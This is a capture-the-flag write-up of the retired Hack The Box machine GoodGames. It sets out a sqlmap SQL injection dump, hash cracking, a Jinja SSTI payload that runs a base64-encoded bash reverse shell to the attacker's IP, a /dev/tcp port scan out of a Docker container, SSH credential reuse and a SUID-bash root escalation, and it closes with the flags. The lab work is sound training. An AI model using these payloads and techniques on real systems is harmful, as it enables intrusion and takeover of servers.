@@ -1,0 +1,130 @@
+# HTB: GoodGames
+- Date completed: August 18, 2025
+- Difficulty: Easy (Retired)
+- Methodology: SQL injection → Admin credential extraction → SSTI exploitation → Docker breakout → Privilege escalation
+
+#RECON
+
+TCP scan:
+
+kali@kali:~/HTB/Machines/g00dg4m3s$ nmap -sV -sC -A -oA g00dg4m3s -p 80 10.129.224.186
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
+|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
+|_http-title: GoodGames | Community and Store
+
+SQLi found at the login page of the website.
+
+Using sqlmap to enumerate the database:
+
+kali@kali:~/HTB/Machines/g00dg4m3s$ sqlmap -r post.txt --batch -D main -T user --dump                
+
+Database: main
+Table: user
+[1 entry]
++----+---------------------+--------+----------------------------------+
+| id | email               | name   | password                         |
++----+---------------------+--------+----------------------------------+
+| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec |
++----+---------------------+--------+----------------------------------+
+
+Cracking the md5 hash:
+
+kali@kali:~/HTB/Machines/g00dg4m3s$ hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force                                 
+
+2b22337f218b2d82dfc3b6f77e7cb8ec:superadministrator
+
+Curling the new host found after logging in as admin, and adding to the host file:
+
+kali@kali:~/HTB/Machines/g00dg4m3s$ curl -I http://internal-administration.goodgames.htb/           
+
+Location: http://internal-administration.goodgames.htb/login
+
+Using the same credentials allowed access to the new host.
+
+SSTI found in the name field of the user settings page:
+
+{{7*7}} changed the name to 49.
+
+Creating a reverse shell:
+
+kali@kali:~/HTB/Machines/g00dg4m3s$ echo -ne 'bash -i >& /dev/tcp/10.10.14.152/4444 0>&1' | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTIvNDQ0NCAwPiYx
+
+#FOOTHOLD
+
+Injected a payload into the name field on the settings page that executed a base64-encoded reverse shell command, resulting in code execution as root inside the Docker container.:
+
+{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTIvNDQ0NCAwPiYx${IFS}|base64${IFS}-d|bash').read()}}
+
+Listener:
+
+kali@kali:~/HTB/Machines/g00dg4m3s$ nc -nvlp 4444                                                   
+listening on [any] 4444 ...
+
+connect to [10.10.14.152] from (UNKNOWN) [10.129.227.159] 43852
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@3a453ab39d3d:/backend#
+
+Getting user.txt:
+
+root@3a453ab39d3d:/backend# cat /home/augustus/user.txt
+
+cf64d5b19a95941b7369df9c7186718f
+
+Breaking out of the docker container:
+
+root@3a453ab39d3d:/backend# for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
+
+port 22 is open
+port 80 is open
+
+Attempting to log in as the augustus user with the previously found password:
+
+root@3a453ab39d3d:/backend# script /dev/null bash
+
+Script started, file is /dev/null
+# ssh augustus@172.19.0.1
+augustus@172.19.0.1's password: superadministrator
+
+#PRIVESC
+
+augustus@GoodGames:~$ cp /bin/bash .
+cp /bin/bash .
+
+exit
+Connection to 172.19.0.1 closed.
+
+ls /home/augustus
+bash  user.txt
+
+# chown root:root bash
+chown root:root bash
+# chmod 4755 bash
+chmod 4755 bash
+
+# ssh augustus@172.19.0.1
+augustus@172.19.0.1's password: superadministrator
+
+augustus@GoodGames:~$ ./bash -p
+
+bash-5.0# whoami
+whoami
+root
+
+Getting root.txt
+
+bash-5.0# cat /root/root.txt
+
+d801d0134ee5d6f573426ba7599e709a
+
+#FLAGS
+
+user.txt : cf64d5b19a95941b7369df9c7186718f
+root.txt : d801d0134ee5d6f573426ba7599e709a
+
+#SUMMARY
+
+The GoodGames machine was compromised by exploiting a SQL injection in the login page to retrieve admin credentials. These credentials revealed an internal administration panel vulnerable to Server-Side Template Injection, which provided a reverse shell inside a Docker container. Enumeration identified the Docker host, and reusing the same credentials allowed SSH access as augustus. By setting SUID on a copied bash binary, privilege escalation to root was achieved.
